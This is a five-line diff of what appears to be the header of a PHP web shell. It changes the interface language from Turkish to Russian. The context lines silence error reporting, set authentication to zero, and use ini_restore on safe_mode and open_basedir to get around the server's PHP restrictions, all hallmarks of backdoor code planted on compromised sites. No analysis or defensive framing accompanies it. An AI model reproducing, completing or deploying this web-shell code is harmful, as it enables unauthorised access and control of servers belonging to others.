@@ -1,5 +1,5 @@
 <?php error_reporting(0);
- $language='tr';
+ $language='ru';
  $auth = 0;
  @ini_restore("safe_mode");
  @ini_restore("open_basedir");
